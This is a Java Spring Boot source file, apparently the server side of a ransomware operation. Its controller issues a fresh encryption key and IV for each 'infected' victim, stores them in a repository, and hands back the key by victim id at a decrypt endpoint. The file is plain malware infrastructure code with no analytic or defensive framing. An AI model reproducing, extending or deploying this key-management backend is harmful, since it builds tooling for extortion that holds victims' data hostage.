package com.ransomware;

import java.security.NoSuchAlgorithmException;

import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RestController;

@RestController
public class RansomwareController {
	
	@Autowired 
	private InfectedRepository infectedRepo;

	public RansomwareController(){}
	
	@RequestMapping("/sendDecrypt")
	public Infected sendDecrypt(String infectedId){
		return infectedRepo.findById(infectedId);
	}
	
	@RequestMapping("/sendEncrypt")
	public Infected sendEncrypt(){
		Infected newInfected = null;
		
		try {
		 newInfected = new Infected(
				KeyIvLogic.getKey(),
				KeyIvLogic.getIv(),
				null);
		} catch(NoSuchAlgorithmException nsae) {
			System.out.println("NoSuchAlgorithmException");
			return null;
		}
		
		infectedRepo.save(newInfected);
		return newInfected;
	}
	
}
